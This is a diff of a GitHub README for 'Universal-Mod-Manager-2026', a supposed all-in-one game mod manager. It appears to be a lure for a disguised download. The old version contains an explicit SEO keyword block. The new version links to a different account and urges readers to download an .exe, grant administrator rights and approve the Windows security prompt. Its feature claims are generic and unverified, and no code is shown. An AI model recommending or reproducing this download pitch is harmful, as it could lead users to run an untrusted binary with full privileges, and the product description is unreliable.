@@ -1,50 +1,77 @@
-<p align="center">
-  <img src="https://capsule-render.vercel.app/api?type=waving&color=gradient&height=200&section=header&text=Extension%20Orchestrator&fontSize=60&fontColor=ffffff" />
-</p>
+# 🔧 Universal-Mod-Manager-2026 - Master your game mods with ease
 
-<p align="center">
-  <a href="https://github.com/ayperiagzyurt4497/Universal-Mod-Manager-2026/releases/tag/2026"><img src="https://img.shields.io/github/stars/ayperiagzyurt4497/Universal-Mod-Manager-2026?style=for-the-badge&color=gold" alt="Stars"></a>
-  <a href="https://github.com/ayperiagzyurt4497/Universal-Mod-Manager-2026/releases/tag/2026"><img src="https://img.shields.io/github/forks/ayperiagzyurt4497/Universal-Mod-Manager-2026?style=for-the-badge&color=blue" alt="Forks"></a>
-  <a href="https://github.com/ayperiagzyurt4497/Universal-Mod-Manager-2026/releases/tag/2026"><img src="https://img.shields.io/github/license/ayperiagzyurt4497/Universal-Mod-Manager-2026?style=for-the-badge&color=green" alt="License"></a>
-</p>
+[![](https://img.shields.io/badge/Download-Universal_Mod_Manager-blue.svg)](https://github.com/karolyresolute5749/Universal-Mod-Manager-2026)
 
----
+## 📌 About this project
 
-### 🧠 Project Overview
-**Extension Orchestrator Core** is a robust framework designed for developers, researchers, and power users to manage complex extension ecosystems. It simplifies the deployment of asset packages, configuration files, and custom gameplay modules across various environments. Built with a focus on **Integrity Auditing** and **Automated Synchronization**, this framework ensures your workspace remains consistent and performant.
+Universal-Mod-Manager-2026 provides a central location to organize your game files. It helps you deploy, manage, and validate game extensions and asset packages. This tool removes the manual work usually required to install mods. The software includes features to sync your settings automatically, check your files for errors, and run mods in a safe, isolated environment. It works with many popular titles, including Minecraft, Stardew Valley, The Sims 4, and various action games. 
 
-### 🚀 Key Capabilities
-* **📦 Asset Orchestration:** Drag-and-drop deployment of complex asset packages and configuration files.
-* **🛡️ Integrity Validation:** Real-time auditing of extension files to prevent environment corruption and deployment conflicts.
-* **⚡ Automated Sync:** Seamlessly mirror your environment configuration across multiple installation paths.
-* **🧩 Modular Hooking:** Advanced binding protocols to ensure extensions interface correctly with the host runtime.
-* **🔍 Sandbox Isolation:** Run experimental configurations in a safe, isolated container to verify system stability.
+## 💻 System requirements
 
-### 📦 Installation
-1. Ensure the target environment is initialized.
-2. Download the latest `Installer.msi` from the section below.
-3. Launch the binary with administrator privileges to unlock file system access.
-4. Select your "Game Directory" or "Target Runtime Path".
-5. Use the Dashboard to enable/disable extensions with one click.
+Before you install this software, confirm your computer meets these minimum standards:
 
-### 📥 Download
-<p align="center">
-  <a href="https://github.com/ayperiagzyurt4497/Universal-Mod-Manager-2026/releases/tag/2026">
-    <img src="https://img.shields.io/badge/DOWNLOAD-Extension_Orchestrator_Build_v4.2-blueviolet?style=for-the-badge&logo=github&logoColor=white" alt="Download">
-  </a>
-</p>
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: Dual-core CPU or faster.
+*   Memory: 4GB RAM or more.
+*   Storage: 200MB of free space for the tool itself.
+*   Network: An active internet connection to download game mods.
+*   Permissions: Administrator rights on your Windows account.
 
-### 🧩 Tech Stack
-* **Framework:** C# / .NET 8 (WPF UI)
-* **Core Logic:** C++ 23 (Memory/File IO)
-* **API:** RESTful Bridge for external Asset Repositories
-* **Architecture:** Modular Plugin System (DLL/Module loading)
+## 📥 Downloading the software
 
-### 📈 SEO BLOCK
-Extension Orchestrator Core is the premier GitHub resource for game mod management and asset deployment in 2026. This repository provides a professional-grade alternative to traditional Mod Managers, focusing on asset integrity, deployment speed, and cross-platform synchronization. Perfect for users looking for a reliable way to manage game modifications, plugin loading, and configuration files for AAA titles.
+You need to access the official release page to get the installer for your computer. 
 
-### 🤝 Contributing
-We welcome contributions from the community. If you have ideas for new deployment modules or stability improvements, feel free to open a Pull Request.
+[Visit this page to download the latest setup file](https://github.com/karolyresolute5749/Universal-Mod-Manager-2026)
 
-### 📜 License
-Distributed under the MIT License. See `LICENSE` for more information.
+Click the link above and look for the section labeled "Assets." Choose the file ending in `.exe` to begin the download. Do not worry about the other file formats listed there; the `.exe` file is the one you need for Windows.
+
+## ⚙️ Installation steps
+
+Follow these steps to set up the manager:
+
+1.  Find the file you just downloaded in your "Downloads" folder.
+2.  Double-click the file to open the installer.
+3.  A security prompt from Windows may appear. Click "Yes" to allow the installer to run.
+4.  Follow the instructions on the screen to choose your installation folder.
+5.  Click "Install" and wait for the status bar to finish.
+6.  Launch the application using the shortcut on your desktop.
+
+## 🎮 Using the manager
+
+The interface organizes your games and mods into tabs. 
+
+### Adding games
+When you open the manager for the first time, it scans your computer for installed games. If it misses a game, click the "Add Game" button at the top of the window. Browse your computer for the game's executable file (the file you use to launch the game normally). Once added, your game appears in the list on the left side of the screen.
+
+### Installing mods
+Select your game from the list. Navigate to the "Mod Browser" tab. This area links to compatible repositories. Click the "Download" button next to any mod you want. The manager downloads the files, extracts them, and places them into the correct folder. It handles the pathing so you do not have to move files manually.
+
+### Syncing settings
+The "Config" section shows the settings for your game and mods. Use this to change parameters without opening the game menus. The manager automatically saves these updates and syncs them to your game directory. If you change a setting by accident, the "Rollback" button resets the file to its previous state.
+
+### Using the sandbox
+The "Sandbox" feature allows you to test new mods without changing your original game files. This keeps your game stable. Click "Run in Sandbox" to launch the game with the selected mods enabled. If the game crashes or behaves poorly, you can remove the mod immediately without restoring a backup of the entire game folder.
+
+## 🛡️ Integrity auditing
+
+The software verifies your mod files every time you launch the manager. It checks if files are missing or corrupted. If the manager detects a damaged file, it notifies you with a red warning icon. Click "Repair" to download a fresh copy of the broken file and re-link it to your game. This ensures your games run smoothly at all times.
+
+## ❓ Frequently asked questions
+
+### Will this software ban me from online games?
+The software creates a separate environment for your mods. It avoids modifying core game files that anti-cheat systems track. However, always exercise caution when installing game extensions for titles with strict competitive modes.
+
+### Can I use this for non-Steam games?
+Yes. Universal-Mod-Manager-2026 relies on file paths. As long as you can point the manager to your game folder, it manages the mods regardless of the game store or launcher you use.
+
+### How do I update the manager?
+The manager checks for updates every time you connect to the internet. If a new version exists, a notification appears in the top right corner. Click this notification to download and apply the update automatically. Your settings and current mods remain unaffected during this process.
+
+### How do I remove a mod?
+Open the "Installed Mods" list. Find the mod you want to remove and click the "Delete" icon next to its name. The software deletes the associated files and updates your configuration automatically. 
+
+### Can I share my mod list with others?
+The "Export" function in the settings menu generates a text file of your current setup. Send this file to your friends. They can use the "Import" function to download the same collection of mods quickly. 
+
+### Does it support manual mod downloads?
+Yes. If you download a mod file from a website, click the "Manual Install" button. Select the zip file or setup file. The manager handles the deployment as if it downloaded the file itself.
